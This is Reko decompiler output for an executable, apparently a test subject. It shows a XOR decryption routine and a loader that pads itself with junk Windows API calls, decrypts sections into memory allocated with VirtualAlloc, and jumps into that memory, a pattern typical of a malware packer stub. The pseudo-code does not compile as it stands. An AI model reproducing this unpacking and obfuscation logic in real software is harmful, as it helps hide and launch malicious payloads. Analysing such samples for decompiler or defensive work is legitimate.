// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 1310D000: Register Eq_2 fn1310D000(Stack (ptr byte) dwArg04, Stack ptr32 dwArg08, Stack Eq_2 dwArg0C, Stack (ptr Eq_2) dwArg10, Stack ui32 dwArg14, Stack Eq_8 dwArg18)
HANDLE fn1310D000(byte * dwArg04, ptr32 dwArg08, HANDLE dwArg0C, HANDLE * dwArg10, ui32 dwArg14, Eq_8 dwArg18)
{
	*dwArg10 = (HANDLE *) dwArg0C;
	CreateSemaphoreA(null, 0x00, 0x00, 0x00);
	union Eq_23 * dwArg08_163 = (word32) (GetLastError() - 0x57) + dwArg08 + dwArg14;
	do
	{
		Eq_2 ebx_130 = dwArg0C;
		dwArg0C = dwArg0C - 0x01;
		if (dwArg0C == null)
			return ebx_130;
		ui32 v21_125 = *((word32) dwArg18.u0 + (word32) wLoc1C);
		ui32 edx_134 = DPB(dwLoc1D, (byte) *dwArg08_163, 0) ^ v21_125 & 0xFF;
		*dwArg04 = (byte) edx_134;
		wLoc1C = (word16) ((word32) SLICE(edx_134, word16, 8) + 0x01);
		ebx_130 = v21_125 & 0xFF;
		dwLoc1D = edx_134;
		if ((int32) wLoc1C == 0x05)
			wLoc1C = 0x00;
		byte * edi_157 = dwArg04 + 0x01;
		if (edi_157 == (byte *) 0x0800)
			return ebx_130;
		union Eq_23 * esi_162 = (char *) dwArg08_163 + 0x01;
		dwArg04 = edi_157;
		dwArg08_163 = esi_162;
	} while (esi_162 != (union Eq_23 *) 0x00F80000);
	return ebx_130;
}

// 1310D0E5: void fn1310D0E5(Register word32 ebp)
void fn1310D0E5(word32 ebp)
{
	LookupPrivilegeValueW(null, null, fp - 0x02C4);
	ptr32 esp_112 = fp - 0x02E4;
	if (false)
	{
		Eq_86 eax_315 = WriteProfileSectionW(null, null);
		word32 v14_322 = eax_315 + 0xFFF5 ^ ((eax_315 ^ 0x13101FF6) ^ 0x01);
		word32 esi_327 = v14_322->dw0000;
		fn1310D000(fp - 0x023C, fp - 0x023C, (void *) 0x04, fp - 0x10, fp - 0x0234 ^ fp - 0x0234, fp - 0x0234);
		Eq_2 esi_368 = fp - 0x10 ^ fp - 0x10;
		word32 v17_373 = Mem0[v14_322 + 0x04:word32] + (WaitForSingleObject(esi_368, 0x04000000) + 0x01);
		fn1310D000(fp - 600, fp - 0x025C, esi_368, (HANDLE *) 0x04000000, 0x04, fp - 0x10);
		ui32 edi_386 = v14_322->dw0008;
		fn1310D000(fp - 0x14, fp - 0x1C, (void *) 0x04, fp - 0x10, 0x08, fp - 0x0234);
		word32 esi_418 = v14_322->dw000C;
		fn1310D000(fp - 0x1C, fp - 0x28, (void *) 0x04, fp - 0x10, 0x0C, fp - 0x0234);
		CreateFileW(null, 0x00, 0x00, null, 0x00, 0x00, (void *) 0x04);
		dwLoc0248 = v14_322->t0010;
		fn1310D000(fp - 0x0248, fp - 600, (void *) 0x04, fp - 0x10, 0x10, fp - 0x0234);
		WritePrivateProfileStringA(0x00, 0xB8000000, 0x00, 0x00);
		Eq_207 ebx_494 = edi_386 * 0x08 + 0x0C;
		dwLoc023C = esi_327;
		dwLoc0258 = v17_373;
		dwLoc14 = edi_386;
		dwLoc024C = 0x14;
		dwLoc24 = (word32 *) ((char *) &v14_322->t0010 + 0x04);
		dwLoc2C = ebx_494;
		esp_112 = fp - 0x032C;
		dwLoc0260 = VirtualAlloc(eax_315 - 0x01, ebx_494 + v17_373 + esi_327, 0x00, 0xB8000000);
		dwLoc0C = (char *) ebx_494 + (esi_418 + 0x13100000);
		dwLoc0264 = ebx_494;
		dwLoc08 = 0x00;
		dwLoc18 = null;
	}
	while (0x01 != 0x00)
	{
		union Eq_17 * esp_191 = esp_112 - 0x04;
		*esp_191 = 0x00;
		*(esp_191 - 0x04) = 0x00;
		*(esp_191 - 0x08) = 0x00;
		WritePrivateProfileSectionA(*(esp_191 - 0x08), *(esp_191 - 0x04), *esp_191);
		esp_112 = esp_191 - 0x08;
		if (dwLoc0264 == dwLoc0248)
		{
			ui32 ecx_230 = dwLoc08 + 0x01;
			dwLoc08 = ecx_230;
			if (ecx_230 == dwLoc14)
				break;
			word32 ecx_236 = *dwLoc24;
			*(esp_191 - 0x0C) = fp - 0x0234;
			*(esp_191 - 0x10) = dwLoc024C;
			*(esp_191 - 0x14) = fp - 0x10;
			*(esp_191 - 0x18) = 0x04;
			*(esp_191 - 0x1C) = fp - 0x1C - dwLoc024C;
			*(esp_191 - 0x20) = fp - 0x1C;
			fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			LPVOID * edx_266 = dwLoc24 + 0x01;
			dwLoc0248 = (Eq_207) *edx_266;
			*(esp_191 - 0x0C) = fp - 0x0234;
			ui32 edi_263 = dwLoc024C + 0x04;
			*(esp_191 - 0x10) = edi_263;
			*(esp_191 - 0x14) = fp - 0x10;
			*(esp_191 - 0x18) = 0x04;
			*(esp_191 - 0x1C) = fp - 0x0248 - edi_263;
			*(esp_191 - 0x20) = fp - 0x0248;
			fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
			dwLoc024C = edi_263 + 0x04;
			dwLoc24 = (word32 *) ((char *) edx_266 + 0x04);
			dwLoc0264 = null;
			dwLoc0C = ecx_236 + 0x13100000;
		}
		Mem215[dwLoc0260 + dwLoc18:byte] = Mem196[dwLoc0C + 0x00:byte];
		esp_112 = esp_112 - 0x0C;
		dwLoc0C = dwLoc0C + 0x01;
		dwLoc18 = dwLoc18 + 0x01;
		dwLoc0264 = (Eq_207) ((char *) dwLoc0264 + 0x01);
	}
	ptr32 * esp_120 = esp_112 - 0x04;
	*esp_120 = fp - 0x0234;
	*(esp_120 - 0x04) = (LPVOID *) dwLoc2C;
	*(esp_120 - 0x08) = fp - 0x0238;
	*(esp_120 - 0x0C) = (LPVOID *) dwLoc0258;
	*(esp_120 - 0x10) = (LPVOID *) (dwLoc0260 - dwLoc2C);
	*(esp_120 - 0x14) = (union Eq_250 *) dwLoc0260;
	word32 ebx_145 = fn1310D000(dwArg00, dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14);
	*esp_120 = fp;
	*(esp_120 - 0x04) = fp - 0x0234;
	*(esp_120 - 0x08) = (LPVOID *) dwLoc0258;
	*(esp_120 - 0x0C) = dwLoc023C;
	*(esp_120 - 0x10) = (union Eq_250 *) dwLoc0260;
	word32 ecx_168 = dwLoc0260 + dwLoc0258;
	*(esp_120 - 0x14) = (LPVOID *) ecx_168;
	ptr32 esp_172;
	word32 ebp_173;
	byte SCZO_174;
	word32 eax_175;
	word32 esi_176;
	byte SZO_177;
	byte C_178;
	byte Z_179;
	word32 edi_180;
	word32 ecx_181;
	word32 edx_182;
	word32 ebx_183;
	byte bl_184;
	(dwLoc0260 + 5056)();
	*(esp_172 - 0x04) = 0x00;
	ExitProcess(*(esp_172 - 0x04));
}

